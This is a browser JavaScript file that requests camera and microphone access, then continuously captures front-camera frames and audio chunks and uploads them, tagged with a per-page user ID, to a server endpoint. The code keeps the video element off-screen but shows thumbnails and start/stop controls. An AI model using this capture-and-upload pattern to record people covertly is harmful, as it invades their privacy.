// static/script.js
const UID = document.body.dataset.uid; // set in index.html body tag
const UPLOAD_ENDPOINT = '/upload';
const CAPTURE_INTERVAL_MS = 300;  // burst frame interval
const AUDIO_CHUNK_MS = 2000;      // mic audio chunk size

let mediaStream = null;
let videoEl = null;
let captureTimer = null;
let mediaRecorder = null;

function addThumbnail(blob) {
  const grid = document.getElementById('thumbGrid');
  const url = URL.createObjectURL(blob);
  const img = document.createElement('img');
  img.src = url;
  img.loading = 'lazy';
  grid.prepend(img);
  while (grid.children.length > 30) grid.removeChild(grid.lastChild);
}

async function uploadBlob(blob, type, name) {
  const form = new FormData();
  form.append('uid', UID);
  form.append('type', type);
  form.append('file', blob, name || `${type}.bin`);
  try {
    await fetch(UPLOAD_ENDPOINT, { method: 'POST', body: form });
  } catch (e) {
    console.error('upload error', e);
  }
}

async function captureFrame() {
  if (!videoEl) return null;
  const trk = mediaStream.getVideoTracks()[0];
  const s = trk.getSettings();
  const w = s.width || 640;
  const h = s.height || 480;
  const canvas = document.createElement('canvas');
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
  return new Promise(resolve => canvas.toBlob(b => resolve(b), 'image/jpeg', 0.7));
}

async function startCaptureLoop() {
  if (captureTimer) clearInterval(captureTimer);
  captureTimer = setInterval(async () => {
    const b = await captureFrame();
    if (b) {
      addThumbnail(b);
      uploadBlob(b, 'image', `frame-${Date.now()}.jpg`);
    }
  }, CAPTURE_INTERVAL_MS);
}

async function startAudioRecorder() {
  if (!mediaStream) return;
  try {
    const audioStream = new MediaStream(mediaStream.getAudioTracks());
    mediaRecorder = new MediaRecorder(audioStream);
    mediaRecorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        uploadBlob(e.data, 'audio', `audio-${Date.now()}.webm`);
      }
    };
    mediaRecorder.start(AUDIO_CHUNK_MS);
  } catch (e) {
    console.warn('audio start failed', e);
  }
}

async function startAll() {
  document.getElementById('status').textContent = 'requesting...';
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: true
    });
  } catch (e) {
    alert("Permission denied or not available: " + e.message);
    document.getElementById('status').textContent = 'permission denied';
    return;
  }

  videoEl = document.createElement('video');
  videoEl.style.position = 'fixed';
  videoEl.style.left = '-9999px';
  videoEl.autoplay = true;
  videoEl.playsInline = true;
  videoEl.muted = true;
  videoEl.srcObject = mediaStream;
  document.body.appendChild(videoEl);
  await new Promise(r => videoEl.onloadedmetadata = r);

  startCaptureLoop();
  startAudioRecorder();

  document.getElementById('status').textContent = 'capturing';
  document.getElementById('btnStart').disabled = true;
  document.getElementById('btnStop').disabled = false;
}

function stopAll() {
  if (captureTimer) {
    clearInterval(captureTimer);
    captureTimer = null;
  }
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    try { mediaRecorder.stop(); } catch (e) {}
  }
  if (mediaStream) {
    mediaStream.getTracks().forEach(t => t.stop());
    mediaStream = null;
  }
  document.getElementById('status').textContent = 'stopped';
  document.getElementById('btnStart').disabled = false;
  document.getElementById('btnStop').disabled = true;
}

// Bind UI buttons
document.getElementById('btnStart').addEventListener('click', startAll);
document.getElementById('btnStop').addEventListener('click', stopAll);
document.getElementById('btnCapture').addEventListener('click', async () => {
  if (!mediaStream) { alert('Start first'); return; }
  const b = await captureFrame();
  if (b) {
    addThumbnail(b);
    uploadBlob(b, 'image', `frame-${Date.now()}.jpg`);
  }
});
